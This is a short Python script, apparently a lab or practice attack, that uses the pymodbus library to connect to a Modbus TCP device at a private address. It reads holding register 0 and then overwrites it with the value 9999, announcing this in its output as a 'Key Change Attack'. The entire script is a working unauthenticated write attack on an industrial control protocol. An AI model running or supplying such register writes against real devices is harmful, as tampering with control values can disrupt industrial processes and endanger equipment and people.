from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('192.168.31.177', port=502)
client.connect()

print("[*]Modbus Connection attempt ..")

result = client.read_holding_registers(address=0, count=1)
print(f"[*] Read Sucess: {result.registers}")

print("[*] Key Change Attack ..")
client.write_register(address=0, value=9999)
print("[*] Key Change Sucess!")
client.close()
